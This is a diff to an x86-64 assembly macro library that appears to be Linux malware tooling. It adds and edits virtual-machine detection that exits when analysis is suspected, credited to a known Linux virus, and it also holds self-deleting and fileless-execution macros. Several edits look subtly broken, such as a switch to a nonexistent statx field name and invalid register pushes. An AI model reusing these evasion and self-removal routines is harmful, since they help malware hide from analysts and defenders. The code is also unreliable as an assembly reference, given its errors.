@@ -336,8 +336,8 @@
 ;
 ; Converts an IP address in 'source_ip' register (RAX by default) to hexadecimal
 ; Returns -i in RAX if errors occurred
-%macro ip2hex 1      
-    push rax
+%macro ip2hex 0-1 rax      
+    push %1
     pop rsi
     strlen
     push rax
@@ -363,7 +363,7 @@
     push "."
     pop al
     cld
-    repne   scasb
+    repne scasb
     push rcx
     pop rbx
     neg     rbx
@@ -531,7 +531,7 @@
 ; Default trigger for positive detection is 2 cores (or less)
 ; Returns 1 in RAX if VM was detected; 0 otherwise
 ;%macro vm_cpu 0-1 2
-;    run ""
+;    run " "
 ;    file_open ".numcpu"
 ;    push rax
 ;    pop rdi
@@ -554,21 +554,23 @@
 ;
 ; My implementation of @elfmaster's VM detection as seen in Linux.Retaliation
 ; Checks for abnormally small interval between current Epoch stamp 
-; and 'stx_btime' field of a file created when the host was set up  
+; and 'st_btime' field of a file created when the host was set up  
 ; Such approach might trigger false positives if tested file was modified after the OS deployment
-%macro vm_age 0-1 "/etc/hostname"
-    save_regs r9, r10
-    push SYS_STATX
+%macro vm_age 0-3 1,HOURS,"/etc/hostname"
+    push 332
     pop rax
     xor rdi, rdi
     init_string rsi, %1
     reserve_stack_bytes_rel STATX_size, r8 
     syscall
-    mov r9, [r8+STATX.stx_btime_seconds] 
+    mov r9, [r8+STATX.st_btime] 
     time_get
     sub rcx, r8
     interval_to_seconds r10,%2,%3
-    restore_regs r9, r10
+    cmp rcx, r10
+    jle %%cont
+    exit 0
+    %%cont:
 %endmacro
 
 ; Args -> None
@@ -593,6 +595,19 @@
 %endmacro
 
 ; ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ [ = 0x04 = ] ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ 
+
+; Args -> [destination] (register), multiplier (int), interval (unit)
+;
+; Converts a given interval to seconds and stores it
+%macro interval_to_seconds 0-3 rcx,1,HOURS
+    push %2
+    pop rax
+    push %3
+    pop rdx
+    mul rdx
+    push rax
+    pop %1      ; Seconds are returned in the destination register
+%endmacro
 
 ; Args -> syscall_number (int)
 ;
@@ -621,7 +636,7 @@
 ;       0 if number of seconds equals the specified time unit
 ;      -1 if seconds < (multiplier*interval) 
 ;       1 if seconds > (multiplier*interval)
-%macro time_compare 
+%macro time_compare 3
     save_regs r8
     %%init_seconds_in_r8:
     interval_to_seconds r8,%2,%3
@@ -802,7 +817,7 @@
     pop rax
     syscall
     cmp rax, 1
-    je %sid_already_set
+    je %%sid_already_set
     exit 0
     %%sid_already_set:
 %endmacro
@@ -1605,7 +1620,7 @@
     xor r10, r10
     push SYS_EXECVEAT
     pop rax
-    push ""
+    push " "
     pop rsi
     push AT_EMPTY_PATH
     pop r8
@@ -1777,13 +1792,13 @@ phdrsize    equ $ - phdr
 ; The only argument is optional and should be a register
 ; It has to contain the name of the binary 
 ; This macro can be invoked without any arguments - it will load *argv0 from [rsp+8] address
-%macro remove_self 0-1 0xffffffff
+%macro remove_self 0-1 TRUE
     push SYS_OPEN
     pop rax
     push %1
     pop r13
-    cmp r13, 0xffffffff
-    je %%load_argv0_from_stack:
+    cmp r13, TRUE
+    je %%load_argv0_from_stack
     push %1
     pop rdi
     jmp %%read
